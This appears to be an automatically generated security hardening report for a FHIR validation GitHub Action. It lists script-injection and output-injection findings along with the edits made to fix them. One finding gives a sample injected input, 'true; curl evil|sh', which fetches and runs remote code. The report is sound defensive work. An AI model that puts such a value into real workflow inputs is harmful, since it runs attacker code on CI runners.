<!-- markdownlint-disable -->

# Hardening Report: FirelyTeam--firely-terminal-pipeline/v0.11.3

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **FirelyTeam--firely-terminal-pipeline/v0.11.3** was hardened automatically. 9 finding(s) were identified and resolved across 3 iteration(s).

## Findings Fixed

### unpinned-uses (severity: high)

action.yml has a composite step that uses a mutable tag instead of a full commit SHA: `uses: actions/upload-artifact@v7` (step 'Upload Quality Control report'). All other uses: refs (actions/cache/restore, actions/cache/save, patrick-werner/validation-outcome-markdown-renderer) are pinned to 40-char SHAs.

Locations:

- `action.yml:833`

### github-env-injection (severity: high)

Step 'Determine FHIR package cache key' writes workflow-controlled values to $GITHUB_OUTPUT without the printf '%s' ... | tr -d '\n\r' sanitization: `echo "key=fhir-packages-${RUNNER_OS}-ft${installedFirelyTerminalVersion:-$FIRELY_TERMINAL_VERSION}-zts${INPUT_TERMINOLOGY_SERVICE_BFARM_ENABLED}-..." >> "$GITHUB_OUTPUT"`. FIRELY_TERMINAL_VERSION comes from inputs.FIRELY_TERMINAL_VERSION and INPUT_TERMINOLOGY_SERVICE_BFARM_ENABLED from inputs.TERMINOLOGY_SERVICE_BFARM_ENABLED. A newline in either value can add arbitrary step outputs, which then feed the cache path/key.

Locations:

- `action.yml:442`

### script-injection (severity: high)

Rule (b), plus dynamic evaluation. In step 'Download Java Validator' the input JAVA_VALIDATOR_DOWNLOAD_LOCATION (inputs.JAVA_VALIDATOR_DOWNLOAD_LOCATION) is run through `JAVA_VALIDATOR_DOWNLOAD_LOCATION=$(eval echo "$JAVA_VALIDATOR_DOWNLOAD_LOCATION")`, so any $(...), backticks or ';' in the input is executed. It is then expanded unquoted in `wget -q $JAVA_VALIDATOR_DOWNLOAD_LOCATION -O validator_cli.jar`. `if $INPUT_JAVA_VALIDATION_ENABLED; then` also runs the input value as a command.

Locations:

- `action.yml:874`

### script-injection (severity: high)

Rule (b): many steps expand input-derived env vars unquoted, and in `if $INPUT_X; then` the input value is run as a command. Examples: `if $INPUT_DOTNET_VALIDATION_ENABLED || $INPUT_TERMINOLOGY_SERVICE_BFARM_ENABLED; then` ('Check if .NET is installed', 'Install Firely.Terminal'); `if $INPUT_DOTNET_VALIDATION_ENABLED; then` (several .NET steps); `if $INPUT_SUSHI_ENABLED; then`, `if $CLOSE_SLICING_FOR_VALIDATION; then`, `if $INPUT_JAVA_SNAPSHOT_ENABLED; then`, `if $INPUT_JAVA_VALIDATION_ENABLED; then`, `elif $INPUT_REPORT_RENDERER_ENABLED; then`. Any boolean-flag input set to e.g. `true; curl evil|sh` executes arbitrary commands.

Locations:

- `action.yml:106`
- `action.yml:122`
- `action.yml:133`
- `action.yml:148`
- `action.yml:185`

### script-injection (severity: high)

Rule (b): step 'Install Firely.Terminal' has an unquoted input expansion: `dotnet tool install --global Firely.Terminal --version $FIRELY_TERMINAL_VERSION > /dev/null` (inputs.FIRELY_TERMINAL_VERSION).

Locations:

- `action.yml:136`

### script-injection (severity: high)

Rule (b): step 'Simplifier login' expands credential inputs unquoted: `fhir login email=$INPUT_SIMPLIFIER_USERNAME password=$INPUT_SIMPLIFIER_PASSWORD`.

Locations:

- `action.yml:160`

### script-injection (severity: high)

Rule (b): steps 'Install fsh-sushi', 'Generate conformance resources with SUSHI' and 'Re-run SUSHI...' have unquoted input expansions: `sudo npm install -g fsh-sushi@$SUSHI_VERSION` and `sushi $INPUT_SUSHI_OPTIONS` (inputs.SUSHI_VERSION, inputs.SUSHI_OPTIONS).

Locations:

- `action.yml:700`
- `action.yml:718`
- `action.yml:1060`

### script-injection (severity: high)

Rule (b): step 'Run Quality Control checks' has unquoted input expansions: `if echo $INPUT_EXPECTED_FAILS | grep -w -q VALIDATION_CONFORMANCE_DOTNET` and `fhir check $INPUT_PATH_TO_QUALITY_CONTROL_RULES $CHECK_ARGS`.

Locations:

- `action.yml:798`

### script-injection (severity: high)

Rule (b): steps 'Validate all conformance resources' and 'Validate all example resources' expand workflow-controlled data unquoted: `for p in $INPUT_PATH_TO_CONFORMANCE_RESOURCES`, `for p in $PATH_TO_EXAMPLES`, `if echo $INPUT_EXPECTED_FAILS | grep ...`, and `java -jar validator_cli.jar $GITHUB_WORKSPACE/$p*.xml ... -version $FHIR_VERSION $INPUT_JAVA_VALIDATION_OPTIONS $UNESCPAED_IG_DEPENDENCIES ...`. Also, step 'Remove package cache...' runs `rm -rf $fhirCacheLocation` unquoted.

Locations:

- `action.yml:930`
- `action.yml:1010`
- `action.yml:855`

## Iteration Notes

### Iteration 1

**Fixes applied:** unpinned-uses, github-env-injection, script-injection

**Notes:**

All changes are in action.yml.

- Pinned actions/upload-artifact@v7 to its full commit SHA, cf430e030ddbb5b0abf93d22962f4752f3646cd9, with a '# v7' comment.
- 'Determine FHIR package cache key': the cache path and the key are now built into variables first. Newlines are stripped with printf '%s' | tr -d '\n\r' before writing to GITHUB_OUTPUT. Command output is captured in its own assignment, so a failing command still stops the step under errexit.
- Every 'if $INPUT_X' boolean check (including elif, && and || forms) is now [ "$INPUT_X" = "true" ], so the input value is never run as a command. Upstream already behaved this way for the values true and false.
- Removed the 'eval echo' on JAVA_VALIDATOR_DOWNLOAD_LOCATION. Bash string replacement now fills in only the $JAVA_VALIDATOR_VERSION / ${JAVA_VALIDATOR_VERSION} placeholder, and the URL passed to wget is quoted. Side effect: any other $VAR or $(...) written in this input is no longer expanded.
- Quoted single values: the Firely Terminal version, the Simplifier login arguments, fsh-sushi@version, $USER, the ZTS download URL, rm -rf "$fhirCacheLocation" and the supportedVersions loop.
- 'Run Quality Control checks': CHECK_ARGS and NO_FAIL_ARGS are now bash arrays. The optional quality control rules path is passed as ${VAR:+"$VAR"}, so it drops out when empty. The EXPECTED_FAILS check now uses printf '%s\n' "$VAR" | grep -w.
- The list inputs (SUSHI_OPTIONS, JAVA_VALIDATION_OPTIONS, PATH_TO_CONFORMANCE_RESOURCES, PATH_TO_EXAMPLES) and the IG dependency list from package.json go into arrays assigned without quotes (arr=($VAR)). That splits and globs exactly as upstream's unquoted use did, and nothing in the value is evaluated.
- The -ig parameter strings are now arrays, and the java validator calls now quote the paths while keeping the *.xml and *.json globs. -version "$FHIR_VERSION" is quoted.

None of this has been run; I only edited the file.

### Iteration 1

**Fixes applied:** github-env-injection

**Notes:**

Sanitized fhirVersion (read from package.json/sushi-config.yaml) with printf '%s' | tr -d '\n\r' before writing FHIR_VERSION to $GITHUB_ENV in the 'Detect FHIR version' step.

### Iteration 1

**Fixes applied:** publish-gate

**Notes:**

action.yml:393: appended '|| true' to the packageJsonHash sha256sum capture to preserve upstream's non-aborting behaviour (upstream ran it inside echo "$(...)").

